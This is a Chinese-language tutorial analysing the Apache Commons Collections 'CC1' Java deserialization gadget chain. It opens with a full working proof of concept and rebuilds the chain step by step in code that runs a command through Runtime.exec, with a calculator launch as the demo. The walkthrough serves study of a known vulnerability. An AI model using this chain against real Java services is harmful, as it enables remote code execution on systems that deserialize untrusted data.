<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h4 data-content="1" id="f85c8ff74b534eef2cb2719f0a4ebf7b">CC1链</h4>
<h5 data-content="1" id="d929226df43dbfd62698703d8f512c93">最终的Poc</h5>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
                    <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                    <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
                    <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                    <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
                    <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                    <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
    <span class="o">};</span>
    <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>

    <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;();</span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"value"</span><span class="o">);</span>
    <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">decorate</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
    <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
    <span class="n">Constructor</span> <span class="n">con</span><span class="o">=</span><span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="n">con</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>


    <span class="c1">//这里new了一个动态代理 调用处理器的对象 然后给我们的memberValues他的值就给赋值上了 他的值就是decorate</span>
    <span class="c1">//也就是我们的Lazmap.decorate</span>
    <span class="n">InvocationHandler</span> <span class="n">annotationInvocationHandler</span><span class="o">=(</span><span class="n">InvocationHandler</span><span class="o">)</span><span class="n">con</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">decorate</span><span class="o">);</span>
    <span class="n">Map</span>  <span class="n">proxymap</span><span class="o">=(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">annotationInvocationHandler</span><span class="o">);</span>


    <span class="c1">//这里是反序列化的代码 这里反序列化会调用代理类的代理方法 从而调用到我们的调用处理器的invoke方法</span>
    <span class="n">Object</span> <span class="n">obj</span><span class="o">=</span><span class="n">con</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">proxymap</span><span class="o">);</span>

    <span class="n">serialize</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>


<span class="o">}</span>
</pre></div>
<h5 data-content="1" id="cf3f8ecf43ceb00a0f990f29b1d57652">流程分析</h5>
<p>我们首先来transformer接口,这里他接收一个对象，我们去找他的实现类。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191349-b0d9e3b6-14db-1.png"/><br/>
来到InvokerTransformer类，这个类实现了Transformer接口，并且他的transformer方法接口一个对象，并且进行了方法的调用。</p>
<p>我们可以看到这里getMethod方法中传入了两个参数，一个是方法名，一个是方法的参数，我们去查看这两个参数是否可控。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191405-ba8cdea4-14db-1.png"/><br/>
在InvokerTransformer类中的构造器对iMethodName参数和iParamTypes参数进行了赋值。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191418-c27710ee-14db-1.png"/><br/>
看到这里那么我们是不是可以利用InvokerTransformer类来执行命令。</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
<span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">});</span>
<span class="n">invokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">runtime</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191435-cc2e91ca-14db-1.png"/><br/>
既然我们已经找到命令执行的地方了，那我们往上找那个不同类的方法调用了transformer方法</p>
<p>来到TransformerMap类的checkSetValue方法，这个方法调用了transform方法，这里我们去查看valueTransformer是否可控。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191445-d23ae06e-14db-1.png"/><br/>
可以看到这里通过构造器TransformedMap进行赋了值。</p>
<p>但是他的权限修饰符是protected的，所以我们不能直接调用。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191457-d96fc34a-14db-1.png"/><br/>
所以来到TransformedMap的decorate方法，他是static静态方法，所以是可以直接调用的。</p>
<p>这里去new了一个TransformedMap 将我们的valueTransformer传进去了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191506-dee566e0-14db-1.png"/><br/>
到这里那我们是不是可以补充我们的链:</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">});</span>
<span class="c1">//        invokerTransformer.transform(runtime);</span>
        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
</pre></div>
<p>那我们现在是不是要找那个类的那个方法调用了TransformerMap类的checkSetValue方法。</p>
<p>可以看到在MapEntry类的setValue方法 调用了checkSetValue，这里的parent是通过构造器MapEntry进行赋值的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191525-ea475c28-14db-1.png"/><br/>
这里的话，他其实是重写了Entry的setValue方法，就是我们如果遍历被修饰过的Map，比如TransformedMap，他就会调用setvalue方法。</p>
<p>那么我们是不是就可以这样构造了:</p>
<p>首先遍历entry的话他会调用到setValue方法，之后我们传进去一个runtime，此时的parent使用在遍历TransformedMap的时候给他赋的值。之后再去调用checkSetValue方法将我们的runtime对象传递进去。</p>
<p>然后调用TransformedMap的checkSetValue方法，此时我们的代码中已经给valueTransformer赋值为了InvokerTransformer类</p>
<p>所以他会调用到InvokerTransformer类的transform方法将我们的runtime传递进去。</p>
<p>然后命令执行。</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">});</span>
<span class="c1">//        invokerTransformer.transform(runtime);</span>
        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">decorate</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">invokerTransformer</span><span class="o">);</span>

 <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span><span class="o">:</span><span class="n">decorate</span><span class="o">.</span><span class="na">entrySet</span><span class="o">()){</span>
            <span class="n">entry</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">runtime</span><span class="o">);</span>
</pre></div>
<p>继续往下走，我们去找不同类的那个方法调用了setValue方法，或者直接找那个类的readobject方法中调用了setValue方法。</p>
<p>来到AnnotationInvocationHandler类,这个类是一个动态代理处理器的类。</p>
<p>在他的readobject方法中调用了setValue方法，我们看memberValue是否是可控的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191537-f1700888-14db-1.png"/><br/>
来到AnnotationInvocationHandler构造函数。</p>
<p>这里通过构造函数对memberValue进行了赋值，这里传进去两个参数，第一个参数是一个注解类型的，第二个就是我们的memberValue。</p>
<p>这个类不是public的，他是default类型的，只有在他的包底下，才能访问的到。所以这里需要通过反射进行获取</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191551-f9a2281a-14db-1.png"/><br/>
那我们是不是可以将我们的poc改为:</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">});</span>
<span class="c1">//        invokerTransformer.transform(runtime);</span>
        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">decorate</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">invokerTransformer</span><span class="o">);</span>

<span class="c1">//        for (Map.Entry entry:decorate.entrySet()){</span>
<span class="c1">//            entry.setValue(runtime);</span>
<span class="c1">//        }</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">decorate</span><span class="o">);</span>
</pre></div>
<p>发现我们是执行不了的。</p>
<p>再次回到AnnotationInvocationHandler的readobject方法。</p>
<p>思考3个问题：</p>
<p>1.可以看到他传进去了一个AnnotationTypeMismatchExceptionProxy的对象，我们原本需要传进去进去一个Runtime的对象。</p>
<p>这里似乎好像我们控制不了。</p>
<p>2.Runtime对象是不能序列化的，他没有继承Serializable接口。</p>
<p>3.我们可以看到这里的readobject方法上面有两个if判断，我们需要绕过这两个if判断，然后才能执行。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191604-018feae4-14dc-1.png"/><br/>
我们首先解决Runtime不能序列化的问题。</p>
<p>虽然Runtime是不可以序列化的，但是他的Class是可以序列化的，就是Runtime.class</p>
<p>那我们是不是可以通过反射获取到Runtime</p>
<div class="highlight"><pre><span></span><span class="n">Class</span><span class="o">&lt;</span><span class="n">Runtime</span><span class="o">&gt;</span> <span class="n">runtimeClass</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
<span class="n">Method</span> <span class="n">getRuntime</span> <span class="o">=</span> <span class="n">runtimeClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
<span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="n">getRuntime</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
<span class="n">Method</span> <span class="n">exec</span> <span class="o">=</span> <span class="n">runtimeClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">exec</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">runtime</span><span class="o">,</span><span class="s">"open -a Calculator"</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191614-078e9544-14dc-1.png"/></p>
<p>然后我们将他改成InvokeTransformer版本</p>
<div class="highlight"><pre><span></span><span class="n">Method</span> <span class="n">getRuntimeMethod</span>  <span class="o">=</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}).</span><span class="na">transform</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}).</span><span class="na">transform</span><span class="o">(</span><span class="n">getRuntimeMethod</span><span class="o">);</span>
<span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">}).</span><span class="na">transform</span><span class="o">(</span><span class="n">r</span><span class="o">);</span>
</pre></div>
<p>简单来解释一下这段代码的意思：</p>
<p>前面说到InvokerTransformer通过构造函数对methodName和paramTypes参数进行赋值之后调用transform方法执行。</p>
<p>这里我们可以理解为:第一次实例化InvokerTransformer类,将参数methodName赋值为了getMethod，将paramTypes赋值为了new Class[]{String.class,Class[].class}，最后将args参数赋值为了getRuntime和null。args参数就相当于我们的反射调用invoke的第二个参数。</p>
<p>例如：这里的open -a Calculator 就好比args参数</p>
<div class="highlight"><pre><span></span><span class="n">exec</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">runtime</span><span class="o">,</span><span class="s">"open -a Calculator"</span><span class="o">);</span>
</pre></div>
<p>然后调用我们的transformer方法。此时methodName和paramTypes以及args参数就有值了，这里将Runtime.class传递进去了。进行了反射的调用。</p>
<div class="highlight"><pre><span></span><span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
<span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">);</span>
<span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">input</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>
</pre></div>
<p>这里的代码就好比：</p>
<div class="highlight"><pre><span></span><span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
<span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">getMethod</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">}</span> <span class="o">);</span>
<span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">Runtime</span><span class="o">,</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span> <span class="o">);</span>
</pre></div>
<p>这里可以好好体会一下。</p>
<p>后面两个InvokerTransformer也是如此。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191631-11846efc-14dc-1.png"/><br/>
我们发现这里是一个transformer的循环调用。</p>
<p>思考：我们能不能找一个循环调用transformer的类？答案是有的</p>
<p>我们找到ChainedTransformer的transformer方法</p>
<p>我们发现他的构造函数允许我们传入一个transformer的数组，然后调用他的transform方法进行循环调用。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191644-1972ce74-14dc-1.png"/><br/>
那我们是不是可以这么构造？</p>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
<span class="o">};</span>

<span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
<span class="n">chainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191658-215da3b6-14dc-1.png"/><br/>
我们继续重新构造payload:</p>
<p>目前改成了这样，将我们的chainedTransformer传递进去，之前我们是直接传递的InvokerTransformer，将我们的chainedTransformer传递进去之后，就会循环调用。</p>
<p>但是发现是执行不了的？</p>
<p>我们上面还有两个问题，接下来需要解决这两个问题。</p>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
<span class="o">};</span>
<span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>

        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">,</span><span class="s">"aaav"</span><span class="o">);</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">decorate</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">decorate</span><span class="o">);</span>
</pre></div>
<p>这里我们进行调试：</p>
<p>首先调用getInstance方法传进去我们的type，就是Override.class，返回annotationType，</p>
<p>接着调用annotationType的memberTypes方法去获取成员方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191710-2910c430-14dc-1.png"/><br/>
接着来到if判断</p>
<p>上面首先获取到memberValues键值对的key，接着调用memberTypes的get方法去查找这个key，memberTypes是我们查找成员方法的时候获取到的。在查找成员方法的时候是没有找到的。</p>
<p>所以他这里是查找不到的也就进入不到if判断。所以我们需要找到一个有成员方法的注解。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191721-2f73d5f6-14dc-1.png"/><br/>
那我们的Retention.class 正好是合适的。或者 Target.class都是可以的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191733-367334a0-14dc-1.png"/><br/>
我们继续调试发现还是走不进去</p>
<p>这里他获取到key是我们Map的 "aaa"</p>
<p>这里他调用getKey方法获取到的是 "aaa"</p>
<p>然后调用memberTypes的get方法，从注解中去获取 "aaa" 这个参数。实际上我们的注解中只有value，是没有aaa的所以我们将Map的key改为value。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191747-3f05e95a-14dc-1.png"/><br/>
改为value之后我们继续进行调试。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191756-441ebcaa-14dc-1.png"/><br/>
此时是可以进去的</p>
<p>我们继续解决第一个问题。这里是不能控制的，怎么能让我们可以控制呢？</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191805-49a0b25a-14dc-1.png"/><br/>
此时引入另一个类：</p>
<p>ConstantTransformer类，这个类的transformer方法，你传进去什么他就给你返回什么。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191814-4f338670-14dc-1.png"/><br/>
最终构造的payload</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191823-5412cf34-14dc-1.png"/><br/>
